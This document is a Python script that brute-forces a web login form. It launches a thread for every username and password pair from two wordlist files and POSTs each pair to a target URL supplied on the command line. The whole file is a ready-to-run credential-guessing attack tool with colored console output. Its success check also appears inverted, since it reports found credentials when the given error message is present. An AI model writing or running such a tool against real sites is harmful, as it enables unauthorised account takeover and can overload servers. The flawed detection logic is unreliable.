import requests, os, threading, platform, sys
from colorama import Fore

def brute(user, passwd):
	try:
		r = requests.post(url, data={"user":user,"pass":passwd})
		if error_msg in r.text:
			print(f" {Fore.WHITE}[{Fore.GREEN}Success{Fore.WHITE}] {Fore.CYAN}{url} {Fore.YELLOW}Trying: [User: {user} Password: {passwd} {Fore.WHITE}")
			print(f" Credentials Found: User: {user} | Password: {passwd}")	
			exit()
		else:
			print(f" {Fore.WHITE}[{Fore.RED}Error{Fore.WHITE}] {Fore.CYAN}{url} {Fore.YELLOW}Trying: -> {Fore.WHITE}User: {user} | Password: {passwd} {Fore.YELLOW} {Fore.WHITE}")
	except:
		pass

def passwd_thread(user):
	for passwd in fpass:
		threading.Thread(target=brute, kwargs={'user':user,'passwd':passwd}).start()

def user_thread():
	for user in fuser:
		threading.Thread(target=passwd_thread, kwargs={'user':user}).start()

if __name__ == "__main__":
	try:
		url = sys.argv[1]
		error_msg = sys.argv[2]
		fuser = open("usernames.txt",encoding="ISO-8859-1").read().splitlines()
		fpass = open("passwords.txt",encoding="ISO-8859-1").read().splitlines()
		if platform.system() == 'Windows':
			os.system('cls')
		else:
			os.system('clear')
		user_thread()

	except Exception as err:
		print(f'[{Fore.RED}Error{Fore.WHITE}] {err}')
		print("Usage:\n python3 {} <url> <error_msg>".format(os.path.basename(__file__)))
